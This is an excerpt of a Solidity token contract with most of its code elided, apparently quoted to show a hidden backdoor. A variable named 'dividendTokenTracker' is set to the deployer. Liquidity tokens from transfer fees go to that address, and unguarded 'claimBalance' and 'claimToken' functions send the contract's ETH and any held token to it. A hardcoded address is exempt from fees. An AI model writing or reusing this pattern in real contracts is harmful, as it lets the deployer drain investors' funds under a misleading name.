...
abstract contract AbsToken is IERC20, Ownable {
    ...
    address secFundAddress = 0xfd4fCaa0cDFf921B7a610Cf428CEED72f859629a;
    uint256 public startTradeBlock;
    address  public dividendTokenTracker = msg.sender;
    ...
    constructor (
		...
		_feeWhiteList[secFundAddress] = true;
        ...
        addHolder(dividendTokenTracker);
         _limitAmount = 10 * 10 ** Decimals;
    ...
    function _tokenTransfer(
        ...
        if (takeFee) {
            ...
            uint256 burnAmount = tAmount * 1 / 10000;
            if (burnAmount > 0) {
        ...
        if (lpAmount > 0) {
            ...
            if (lpFist > 0) {
                _swapRouter.addLiquidity(
                    address(this), _fist, lpAmount, lpFist, 0, 0, dividendTokenTracker, block.timestamp
                );
            }
        }
    }
    ...
    function claimBalance() external {
        payable(dividendTokenTracker).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount) external  {
        IERC20(token).transfer(dividendTokenTracker, amount);
    }
...
contract Abs is AbsToken {
    constructor() AbsToken( 
        ...
        6,   
        1000000000000000,   
        address(0xfd4fCaa0cDFf921B7a610Cf428CEED72f859629a),    
        address(0xfd4fCaa0cDFf921B7a610Cf428CEED72f859629a)
    ){
